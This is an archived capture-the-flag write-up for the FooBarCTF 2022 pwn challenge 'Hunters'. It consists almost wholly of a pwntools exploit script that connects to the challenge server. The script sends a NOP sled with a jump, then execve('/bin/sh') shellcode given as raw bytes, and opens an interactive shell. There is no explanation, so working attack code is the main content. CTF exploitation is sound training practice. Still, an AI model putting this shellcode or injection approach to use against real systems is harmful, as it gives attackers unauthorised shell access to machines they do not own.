# Hunters

**CTF:** FooBarCTF 2022  
**Category:** pwn  
**Original writeup:** <https://ctftime.org/writeup/32367> — by **ctftime.org**. All credit goes to the original author; this is an archived copy.

---

exe = context.binary = ELF('./Hunters')

host = args.HOST or 'chall.nitdgplug.org'

port = int(args.PORT or 30090)

def start_local(argv=[], *a, **kw):

'''Execute the target binary locally'''

if args.GDB:

return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

else:

return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):

'''Connect to the process on the remote host'''

io = connect(host, port)

if args.GDB:

gdb.attach(io, gdbscript=gdbscript)

return io

def start(argv=[], *a, **kw):

'''Start the exploit against the target.'''

if args.LOCAL:

return start_local(argv, *a, **kw)

else:

return start_remote(argv, *a, **kw)

gdbscript = '''

tbreak main

continue

'''.format(**locals())

# -- Exploit goes here --

io = start()

io.sendlineafter(b":", b"\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xeb\x0f") # jmp to next 0x0f

io.sendlineafter(b":", b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05") #shellcode

io.interactive()

```
